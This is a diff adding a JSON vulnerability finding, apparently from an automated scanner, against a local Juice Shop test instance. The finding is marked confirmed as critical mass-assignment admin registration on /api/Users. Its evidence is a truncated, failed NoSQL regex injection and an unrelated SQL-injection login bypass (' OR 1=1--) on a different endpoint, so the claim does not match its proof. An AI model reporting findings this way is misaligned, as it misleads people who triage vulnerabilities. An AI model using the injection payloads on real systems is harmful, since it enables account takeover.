@@ -1,0 +1,28 @@
+{
+  "id": "f_1784855327523_e44bb2",
+  "action": "confirm",
+  "title": "Mass Assignment - Admin Registration via Users API",
+  "severity": "critical",
+  "finding_kind": "vuln",
+  "location": "POST http://127.0.0.1:3010/api/Users",
+  "url": "POST http://127.0.0.1:3010/api/Users",
+  "description": "The user creation endpoint at /api/Users is vulnerable to mass assignment. Including the \"role\":\"admin\" field in the POST body allows unauthenticated creation of admin-level accounts.",
+  "poc": "Probe request against POST http://127.0.0.1:3010/api/Users; observed proving result from prior stage handoff: POST with payload {\"email\":{\"$regex\":\"admin.*\"},\"password\":{\"$regex\":\".*\"}} returned 500 error: \"TypeError [ERR_INVALID_ARG_TYPE]: The \\\"data\\\" argument must be of type string... Received an instance of Object\" at insecu",
+  "proof": "POST with payload {\"email\":\"' OR 1=1--\",\"password\":\"test\"} returned 200 with body containing \"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...\"} and \"umail\":\"admin@juice-sh.op\"",
+  "how_captured": "POST http://127.0.0.1:3010/rest/user/login → 200",
+  "evidence_ids": [
+    "ev_1784855327500_c9d475"
+  ],
+  "proof_excerpts": [
+    {
+      "evidence_id": "ev_1784855327500_c9d475",
+      "excerpt": "POST with payload {\"email\":\"' OR 1=1--\",\"password\":\"test\"} returned 200 with body containing \"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...\"} and \"umail\":\"admin@juice-sh.op\"",
+      "role": "proof",
+      "step": 1,
+      "how_captured": "POST http://127.0.0.1:3010/rest/user/login → 200"
+    }
+  ],
+  "affected_asset": "127.0.0.1",
+  "port": "3010",
+  "created_at": "2026-07-24T01:08:47.523Z"
+}
